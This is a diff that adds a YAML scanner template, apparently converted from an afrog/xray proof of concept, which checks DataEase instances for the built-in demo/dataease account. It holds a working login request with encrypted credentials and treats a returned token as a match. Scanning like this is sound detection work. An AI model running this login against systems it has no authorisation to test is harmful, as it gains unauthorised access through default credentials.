@@ -1,0 +1,34 @@
+# 来源: afrog（转换自 afrog/xray 表达式 POC）
+http:
+  - body: |
+      {
+      "username": "HmFJtDmMa9MZjlWEpCNAo7Yh/hRBI7mrCRfFTok7wES7qcpIJ04x0OQXW5fwtL4WtN29408wyAupmtMjvvXjag==",
+      "password": "sL+oQsnErJMYGiLyzXj/Hy2opaZcSnfjGtYtm48q8tdkkINxzTtAOFI2NgDoorchFE790vWQYIgo1CMyjJ2jnw==",
+      "loginType": 0
+      }
+    headers:
+      Content-Type: application/json
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '"success":true,"message":null,"data":{"token":"ey'
+        condition: and
+    method: POST
+    path:
+      - '{{BaseURL}}/api/auth/login'
+id: dataease-default-account
+info:
+  author: hbdxmz
+  description: "Dataease has a built-in account demo/dataease, and many developers forget to delete or change the account password. \nAs a result, many Dataease can log in with this built-in account. \nWhen logging in, js encrypts the account password with the public key, \nso poc uses the account password encrypted by the public key,  \nmanually uses demo/dataease when logging in to the web page.\nDataEase有一个内置的demo/dataease，许多开发人员忘记删除或更改帐户密码。\n因此，许多DataEase可以使用这个内置帐户登录。\n在登录时，js使用公钥加密帐号密码，PoC使用公钥加密的帐号密码，在登录网页时就手动使用demo/dataase登录。"
+  metadata:
+    argus-execution-class: detection
+    argus-import-license: MIT License
+    argus-import-source: afrog
+    argus-risk-level: high
+  name: Dataease Default Account
+  severity: high
+  tags: dataease,argus-import
